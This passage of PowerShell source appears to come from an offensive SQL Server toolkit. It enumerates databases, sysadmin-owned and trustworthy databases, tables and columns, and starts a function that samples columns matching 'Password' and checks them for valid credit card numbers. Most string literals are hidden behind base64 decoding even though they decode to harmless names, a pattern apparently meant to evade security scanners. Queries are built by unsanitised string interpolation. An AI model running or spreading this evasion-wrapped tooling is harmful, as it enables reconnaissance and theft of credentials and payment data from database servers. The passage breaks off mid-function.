        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AdAByAHUAcwB0AHcAbwByAHQAaAB5AF8AbwBuAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZABiAF8AYwBoAGEAaQBuAGkAbgBnAF8AbwBuAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AYgByAG8AawBlAHIAXwBlAG4AYQBiAGwAZQBkAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZQBuAGMAcgB5AHAAdABlAGQA'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AcgBlAGEAZABfAG8AbgBsAHkA'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGMAbwB2AGUAcgB5AF8AbQBvAGQAZQBsAF8AZABlAHMAYwA='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBOAGEAbQBlAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAFMAaQB6AGUATQBiAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABhAHMAXwBkAGIAYQBjAGMAZQBzAHMA'))))
        if($DatabaseName)
        {
            $DatabaseFilter = " and a.name like '$DatabaseName'"
        }
        else
        {
            $DatabaseFilter = ''
        }
        if($NoDefaults)
        {
            $NoDefaultsFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbgBvAHQAIABpAG4AIAAoACcAbQBhAHMAdABlAHIAJwAsACcAdABlAG0AcABkAGIAJwAsACcAbQBzAGQAYgAnACwAJwBtAG8AZABlAGwAJwApAA==')))
        }
        else
        {
            $NoDefaultsFilter = ''
        }
        if($HasAccess)
        {
            $HasAccessFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAEgAQQBTAF8ARABCAEEAQwBDAEUAUwBTACgAYQAuAG4AYQBtAGUAKQA9ADEA')))
        }
        else
        {
            $HasAccessFilter = ''
        }
        if($SysAdminOnly)
        {
            $SysAdminOnlyFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAEkAUwBfAFMAUgBWAFIATwBMAEUATQBFAE0AQgBFAFIAKAAnAHMAeQBzAGEAZABtAGkAbgAnACwAUwBVAFMARQBSAF8AUwBOAEEATQBFACgAYQAuAG8AdwBuAGUAcgBfAHMAaQBkACkAKQA9ADEA')))
        }
        else
        {
            $SysAdminOnlyFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }
        $QueryStart = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            a.database_id as [DatabaseId],
            a.name as [DatabaseName],
            SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
            IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
            a.is_trustworthy_on,
        a.is_db_chaining_on,"
        if([int]$SQLVersionShort -ge 10)
        {
            $QueryVerSpec = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAGkAcwBfAGIAcgBvAGsAZQByAF8AZQBuAGEAYgBsAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBpAHMAXwBlAG4AYwByAHkAcAB0AGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AcgBlAGEAZABfAG8AbgBsAHkALAA=')))
        }
        $QueryEnd = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBjAHIAZQBhAHQAZQBfAGQAYQB0AGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAHIAZQBjAG8AdgBlAHIAeQBfAG0AbwBkAGUAbABfAGQAZQBzAGMALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgAuAGYAaQBsAGUAbgBhAG0AZQAgAGEAcwAgAFsARgBpAGwAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAKABTAEUATABFAEMAVAAgAEMAQQBTAFQAKABTAFUATQAoAHMAaQB6AGUAKQAgACoAIAA4AC4AIAAvACAAMQAwADIANAAgAEEAUwAgAEQARQBDAEkATQBBAEwAKAA4ACwAMgApACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAcgBvAG0AIABzAHkAcwAuAG0AYQBzAHQAZQByAF8AZgBpAGwAZQBzACAAdwBoAGUAcgBlACAAbgBhAG0AZQAgAGwAaQBrAGUAIABhAC4AbgBhAG0AZQApACAAYQBzACAAWwBEAGIAUwBpAHoAZQBNAGIAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABIAEEAUwBfAEQAQgBBAEMAQwBFAFMAUwAoAGEALgBuAGEAbQBlACkAIABhAHMAIABbAGgAYQBzAF8AZABiAGEAYwBjAGUAcwBzAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEYAUgBPAE0AIABbAHMAeQBzAF0ALgBbAGQAYQB0AGEAYgBhAHMAZQBzAF0AIABhAA0ACgAgACAAIAAgACAAIAAgACAASQBOAE4ARQBSACAASgBPAEkATgAgAFsAcwB5AHMAXQAuAFsAcwB5AHMAZABhAHQAYQBiAGEAcwBlAHMAXQAgAGIAIABPAE4AIABhAC4AZABhAHQAYQBiAGEAcwBlAF8AaQBkACAAPQAgAGIALgBkAGIAaQBkACAAVwBIAEUAUgBFACAAMQA9ADEA')))
        $Filters = "
            $DatabaseFilter
            $NoDefaultsFilter
            $HasAccessFilter
            $SysAdminOnlyFilter
        ORDER BY a.database_id"
        $Query = "$QueryStart $QueryVerSpec $QueryEnd $Filters"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblResults |
        % -Process {
            if([int]$SQLVersionShort -ge 10)
            {
                $is_broker_enabled = $_.is_broker_enabled
                $is_encrypted = $_.is_encrypted
                $is_read_only = $_.is_read_only
            }
            else
            {
                $is_broker_enabled = 'NA'
                $is_encrypted = 'NA'
                $is_read_only = 'NA'
            }
            $null = $TblDatabases.Rows.Add(
                $_.ComputerName,
                $_.Instance,
                $_.DatabaseId,
                $_.DatabaseName,
                $_.DatabaseOwner,
                $_.OwnerIsSysadmin,
                $_.is_trustworthy_on,
                $_.is_db_chaining_on,
                $is_broker_enabled,
                $is_encrypted,
                $is_read_only,
                $_.create_date,
                $_.recovery_model_desc,
                $_.FileName,
                $_.DbSizeMb,
                $_.has_dbaccess
            )
        }
    }
    End
    {
        $TblDatabases
    }
}
Function  Get-SQLDatabaseThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$HasAccess,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$SysAdminOnly,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAEkAZAA='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE8AdwBuAGUAcgA='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAEkAcwBTAHkAcwBhAGQAbQBpAG4A'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AdAByAHUAcwB0AHcAbwByAHQAaAB5AF8AbwBuAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZABiAF8AYwBoAGEAaQBuAGkAbgBnAF8AbwBuAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AYgByAG8AawBlAHIAXwBlAG4AYQBiAGwAZQBkAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZQBuAGMAcgB5AHAAdABlAGQA'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AcgBlAGEAZABfAG8AbgBsAHkA'))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGMAbwB2AGUAcgB5AF8AbQBvAGQAZQBsAF8AZABlAHMAYwA='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBOAGEAbQBlAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAFMAaQB6AGUATQBiAA=='))))
        $null = $TblDatabases.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABhAHMAXwBkAGIAYQBjAGMAZQBzAHMA'))))
        if($DatabaseName)
        {
            $DatabaseFilter = " and a.name like '$DatabaseName'"
        }
        else
        {
            $DatabaseFilter = ''
        }
        if($NoDefaults)
        {
            $NoDefaultsFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbgBvAHQAIABpAG4AIAAoACcAbQBhAHMAdABlAHIAJwAsACcAdABlAG0AcABkAGIAJwAsACcAbQBzAGQAYgAnACwAJwBtAG8AZABlAGwAJwApAA==')))
        }
        else
        {
            $NoDefaultsFilter = ''
        }
        if($HasAccess)
        {
            $HasAccessFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAEgAQQBTAF8ARABCAEEAQwBDAEUAUwBTACgAYQAuAG4AYQBtAGUAKQA9ADEA')))
        }
        else
        {
            $HasAccessFilter = ''
        }
        if($SysAdminOnly)
        {
            $SysAdminOnlyFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAEkAUwBfAFMAUgBWAFIATwBMAEUATQBFAE0AQgBFAFIAKAAnAHMAeQBzAGEAZABtAGkAbgAnACwAUwBVAFMARQBSAF8AUwBOAEEATQBFACgAYQAuAG8AdwBuAGUAcgBfAHMAaQBkACkAKQA9ADEA')))
        }
        else
        {
            $SysAdminOnlyFilter = ''
        }
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if($TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }
            $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
            if($SQLVersionFull)
            {
                $SQLVersionShort = $SQLVersionFull.Split('.')[0]
            }
            $QueryStart = "  SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                a.database_id as [DatabaseId],
                a.name as [DatabaseName],
                SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
                IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
                a.is_trustworthy_on,
            a.is_db_chaining_on,"
            if([int]$SQLVersionShort -ge 10)
            {
                $QueryVerSpec = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AYgByAG8AawBlAHIAXwBlAG4AYQBiAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AZQBuAGMAcgB5AHAAdABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AaQBzAF8AcgBlAGEAZABfAG8AbgBsAHkALAA=')))
            }
            $QueryEnd = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAGMAcgBlAGEAdABlAF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgByAGUAYwBvAHYAZQByAHkAXwBtAG8AZABlAGwAXwBkAGUAcwBjACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgAuAGYAaQBsAGUAbgBhAG0AZQAgAGEAcwAgAFsARgBpAGwAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAFMARQBMAEUAQwBUACAAQwBBAFMAVAAoAFMAVQBNACgAcwBpAHoAZQApACAAKgAgADgALgAgAC8AIAAxADAAMgA0ACAAQQBTACAARABFAEMASQBNAEEATAAoADgALAAyACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABmAHIAbwBtACAAcwB5AHMALgBtAGEAcwB0AGUAcgBfAGYAaQBsAGUAcwAgAHcAaABlAHIAZQAgAG4AYQBtAGUAIABsAGkAawBlACAAYQAuAG4AYQBtAGUAKQAgAGEAcwAgAFsARABiAFMAaQB6AGUATQBiAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIAEEAUwBfAEQAQgBBAEMAQwBFAFMAUwAoAGEALgBuAGEAbQBlACkAIABhAHMAIABbAGgAYQBzAF8AZABiAGEAYwBjAGUAcwBzAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsAcwB5AHMAXQAuAFsAZABhAHQAYQBiAGEAcwBlAHMAXQAgAGEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIABbAHMAeQBzAF0ALgBbAHMAeQBzAGQAYQB0AGEAYgBhAHMAZQBzAF0AIABiACAATwBOACAAYQAuAGQAYQB0AGEAYgBhAHMAZQBfAGkAZAAgAD0AIABiAC4AZABiAGkAZAAgAFcASABFAFIARQAgADEAPQAxAA==')))
            $Filters = "
                $DatabaseFilter
                $NoDefaultsFilter
                $HasAccessFilter
                $SysAdminOnlyFilter
            ORDER BY a.database_id"
            $Query = "$QueryStart $QueryVerSpec $QueryEnd $Filters"
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblResults |
            % -Process {
                if([int]$SQLVersionShort -ge 10)
                {
                    $is_broker_enabled = $_.is_broker_enabled
                    $is_encrypted = $_.is_encrypted
                    $is_read_only = $_.is_read_only
                }
                else
                {
                    $is_broker_enabled = 'NA'
                    $is_encrypted = 'NA'
                    $is_read_only = 'NA'
                }
                $null = $TblDatabases.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DatabaseId,
                    $_.DatabaseName,
                    $_.DatabaseOwner,
                    $_.OwnerIsSysadmin,
                    $_.is_trustworthy_on,
                    $_.is_db_chaining_on,
                    $is_broker_enabled,
                    $is_encrypted,
                    $is_read_only,
                    $_.create_date,
                    $_.recovery_model_desc,
                    $_.FileName,
                    $_.DbSizeMb,
                    $_.has_dbaccess
                )
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblDatabases
    }
}
Function  Get-SQLTable
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$TableName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblTables = New-Object -TypeName System.Data.DataTable
        if($TableName)
        {
            $TableFilter = " where table_name like '%$TableName%'"
        }
        else
        {
            $TableFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing tables from databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG AS [DatabaseName],
                TABLE_SCHEMA AS [SchemaName],
                TABLE_NAME as [TableName],
                TABLE_TYPE as [TableType]
                FROM [$DbName].[INFORMATION_SCHEMA].[TABLES]
                $TableFilter
            ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblTables = $TblTables + $TblResults
        }
    }
    End
    {
        $TblTables
    }
}
Function  Get-SQLColumn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$TableName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by exact column name.')]
        [string]$ColumnName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Column name using wildcards in search.  Supports comma seperated list.')]
        [string]$ColumnNameSearch,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblColumns = New-Object -TypeName System.Data.DataTable
        if($TableName)
        {
            $TableNameFilter = " and TABLE_NAME like '%$TableName%'"
        }
        else
        {
            $TableNameFilter = ''
        }
        if($ColumnName)
        {
            $ColumnFilter = " and column_name like '$ColumnName'"
        }
        else
        {
            $ColumnFilter = ''
        }
        if($ColumnNameSearch)
        {
            $ColumnSearchFilter = " and column_name like '%$ColumnNameSearch%'"
        }
        else
        {
            $ColumnSearchFilter = ''
        }
        if($ColumnNameSearch)
        {
            $Keywords = $ColumnNameSearch.split(',')
            [int]$i = $Keywords.Count
            while ($i -gt 0)
            {
                $i = $i - 1
                $Keyword = $Keywords[$i]
                if($i -eq ($Keywords.Count -1))
                {
                    $ColumnSearchFilter = "and column_name like '%$Keyword%'"
                }
                else
                {
                    $ColumnSearchFilter = $ColumnSearchFilter + " or column_name like '%$Keyword%'"
                }
            }
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG AS [DatabaseName],
                TABLE_SCHEMA AS [SchemaName],
                TABLE_NAME as [TableName],
                COLUMN_NAME as [ColumnName],
                DATA_TYPE as [ColumnDataType],
                CHARACTER_MAXIMUM_LENGTH as [ColumnMaxLength]
                FROM	[$DbName].[INFORMATION_SCHEMA].[COLUMNS] WHERE 1=1
                $ColumnSearchFilter
                $ColumnFilter
                $TableNameFilter
            ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
            $TblColumns = $TblColumns + $TblResults
        }
    }
    End
    {
        $TblColumns
    }
}
Function Get-SQLColumnSampleData
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$Keywords = 'Password',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$ValidateCC,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))))
